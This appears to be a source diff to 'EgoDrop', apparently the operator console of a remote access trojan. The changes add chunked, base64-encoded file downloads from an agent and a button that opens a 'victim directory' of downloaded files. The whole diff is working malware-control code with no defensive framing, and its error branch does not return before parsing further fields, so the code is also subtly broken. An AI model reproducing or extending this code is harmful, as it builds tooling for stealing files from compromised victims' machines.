@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
 using System.Text;
@@ -44,14 +45,43 @@ namespace EgoDrop
 
                     clsFileHandler handler = m_dicHandler[szFilePath];
 
+                    handler.fnSend();
+
                     if (handler.fnbIsLast(nSeq))
+                    {
+                        handler.fnClose();
                         m_dicHandler.Remove(szFilePath);
-                    else
-                        handler.fnSend();
+                    }
                 }
                 else if (lsMsg[1] == "df") //Download File.
                 {
+                    int nCode = int.Parse(lsMsg[2]);
+                    string szFilePath = lsMsg[3];
 
+                    if (!m_dicHandler.ContainsKey(szFilePath))
+                        return;
+
+                    clsFileHandler handler = m_dicHandler[szFilePath];
+
+                    if (nCode == 0)
+                    {
+                        MessageBox.Show("ERROR://" + lsMsg[4]);
+                        m_dicHandler.Remove(szFilePath);
+                    }
+
+                    int nIdx = int.Parse(lsMsg[4]);
+                    int nChunkSize = int.Parse(lsMsg[5]);
+                    byte[] abData = Convert.FromBase64String(lsMsg[6]);
+
+                    int nOffset = nIdx * nChunkSize;
+
+                    handler.fnWrite(nOffset, abData);
+
+                    if (handler.fnbIsLast(nOffset))
+                    {
+                        handler.fnClose();
+                        m_dicHandler.Remove(szFilePath);
+                    }
                 }
             }
         }
@@ -143,6 +173,23 @@ namespace EgoDrop
         private void toolStripMenuItem3_Click(object sender, EventArgs e)
         {
             m_bStop = true;
+        }
+
+        // Open victim directory
+        private void toolStripButton2_Click(object sender, EventArgs e)
+        {
+            string szDir = m_agent.m_szVictimDir + "\\Downloads";
+            if (!Directory.Exists(szDir))
+            {
+                MessageBox.Show("Cannot find directory: " + szDir, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            Process.Start(new ProcessStartInfo()
+            {
+                FileName = szDir,
+                UseShellExecute = true,
+            });
         }
     }
 }
